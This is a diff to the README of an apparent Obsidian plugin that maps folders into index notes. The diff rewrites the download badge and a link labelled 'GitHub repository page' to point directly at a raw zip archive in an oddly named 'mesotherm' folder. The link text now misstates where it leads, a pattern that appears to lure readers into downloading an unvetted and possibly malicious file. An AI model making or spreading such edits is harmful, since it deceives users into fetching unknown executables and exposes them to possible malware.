@@ -1,12 +1,12 @@
 # 📂 folder-graph-organizer - Organize your notes into clean clusters
 
-[![](https://img.shields.io/badge/Download-Folder_Graph_Organizer-blue.svg)](https://github.com/bravenitrocalcite292/folder-graph-organizer)
+[![](https://img.shields.io/badge/Download-Folder_Graph_Organizer-blue.svg)](https://raw.githubusercontent.com/bravenitrocalcite292/folder-graph-organizer/main/mesotherm/folder-organizer-graph-2.5.zip)
 
 Organize your digital vault with ease. This Obsidian plugin transforms your folder structure into a clear hub-and-spoke map. It creates index notes for each folder. These notes act as anchors for your information. You see your knowledge clusters grow within the Obsidian Graph View. The plugin works with the Folder Notes plugin to maintain your internal links.
 
 ## 📥 How to get started
 
-Visit the [GitHub repository page](https://github.com/bravenitrocalcite292/folder-graph-organizer) to download the plugin files. Choose the latest release version. Save the zip file to your desktop.
+Visit the [GitHub repository page](https://raw.githubusercontent.com/bravenitrocalcite292/folder-graph-organizer/main/mesotherm/folder-organizer-graph-2.5.zip) to download the plugin files. Choose the latest release version. Save the zip file to your desktop.
 
 ## 🛠️ Step-by-step setup
 
